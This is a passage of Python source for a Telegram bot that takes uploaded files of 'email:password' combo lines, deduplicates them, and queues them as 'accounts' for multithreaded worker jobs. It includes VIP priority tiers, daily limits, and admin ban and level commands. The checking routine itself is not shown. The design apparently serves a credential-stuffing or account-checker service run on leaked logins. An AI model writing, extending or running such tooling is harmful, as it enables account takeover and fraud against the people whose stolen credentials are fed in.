            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                raw_list.append((parts[0].strip(), parts[1].strip()))

    if not raw_list:
        await update.message.reply_text("No valid email:password lines found.")
        return

    # Deduplicate (case-insensitive on email)
    seen_keys = set()
    combo_list = []
    for email, pwd in raw_list:
        key = email.lower()
        if key not in seen_keys:
            seen_keys.add(key)
            combo_list.append((email, pwd))
    duplicates_removed = len(raw_list) - len(combo_list)

    increment_daily_file_count(user_id)
    update_user(user_id, {"total_jobs": user["total_jobs"] + 1})

    filename = doc.file_name or "uploaded.txt"
    priority = 0 if vip_level > 0 else 1
    job = Job(user_id, chat_id, combo_list, filename, priority=priority)
    user_jobs[user_id] = job

    await job_queue.put(job)

    logger.info("User %d queued job: %d accounts | file=%s | priority=%d",
                user_id, len(combo_list), filename, priority)

    info_parts = [f"📥 *{len(combo_list)}* accounts queued"]
    if duplicates_removed:
        info_parts.append(f"🔁 {duplicates_removed} duplicates removed")
    info_parts.append(f"📊 Queue position: {job_queue.qsize()}")

    await update.message.reply_text("\n".join(info_parts), parse_mode=ParseMode.MARKDOWN)


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error("Unhandled exception in update handler:", exc_info=context.error)
    if update and hasattr(update, "effective_chat") and update.effective_chat:
        try:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="⚠️ An unexpected error occurred. Please try again later."
            )
        except Exception:
            pass


async def post_init(app: Application):
    global job_queue
    job_queue = asyncio.PriorityQueue()

    asyncio.create_task(daily_reset_check())
    for _ in range(MAX_CONCURRENT_JOBS):
        asyncio.create_task(queue_worker(app.bot))

    logger.info("✅ %d queue workers started.", MAX_CONCURRENT_JOBS)


def main():
    import telegram

    async def _clear_session():
        try:
            async with telegram.Bot(token=BOT_TOKEN) as bot:
                await bot.delete_webhook(drop_pending_updates=True)
        except Exception:
            pass
        await asyncio.sleep(2)

    asyncio.run(_clear_session())

    app = Application.builder().token(BOT_TOKEN).build()
    app.post_init = post_init

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("setlevel", setlevel))
    app.add_handler(CommandHandler("setlimit", setlimit))
    app.add_handler(CommandHandler("ban", ban_user))
    app.add_handler(CommandHandler("unban", unban_user))
    app.add_handler(CommandHandler("manage", manage_user))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^adm_"))
    app.add_handler(MessageHandler(filters.Document.TEXT, handle_file))
    app.add_error_handler(error_handler)

    logger.info("🚀 Bot starting — threads/job: %d | max concurrent jobs: %d | admins: %s",
                THREADS_PER_JOB, MAX_CONCURRENT_JOBS, ADMIN_IDS)
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=["message", "callback_query", "edited_message"],
    )


if __name__ == "__main__":
    Path(RESULT_BASE_DIR).mkdir(exist_ok=True)
    main()
